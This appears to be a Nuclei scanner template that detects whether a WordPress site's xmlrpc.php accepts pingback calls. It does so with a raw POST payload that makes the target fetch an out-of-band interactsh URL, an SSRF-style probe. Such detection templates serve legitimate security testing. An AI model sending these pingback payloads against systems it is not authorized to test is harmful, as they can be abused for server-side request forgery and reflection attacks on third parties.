flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - XML-RPC server accepts POST requests only.
  raw:
  - 'GET /xmlrpc.php HTTP/1.1

    Host: {{Hostname}}

    Cookie: humans_21909=1

    '
- matchers:
  - condition: or
    part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  raw:
  - "POST /xmlrpc.php HTTP/1.1\nHost: {{Hostname}}\n\n<methodCall>\n  <methodName>pingback.ping</methodName>\n\
    \  <params>\n    <param>\n      <value>\n        <string>http://{{interactsh-url}}</string>\n\
    \      </value>\n    </param>\n    <param>\n      <value>\n        <string>{{BaseURL}}/?p=1</string>\n\
    \      </value>\n    </param>\n  </params>\n</methodCall>\n"
id: wp-xmlrpc-pingback-detection
info:
  author: pdteam
  description: WordPress XML-RPC Pingback Detection refers to the identification and
    monitoring of XML-RPC Pingback functionality in a WordPress website. This is vulnerable
    to pingback detection and bruteforce attacks.
  metadata:
    max-request: 2
  name: Wordpress XMLRPC - Pingback Detection
  reference:
  - https://github.com/dorkerdevil/rpckiller
  - https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32
  severity: info
  tags: wordpress,ssrf,oast,xmlrpc,vuln
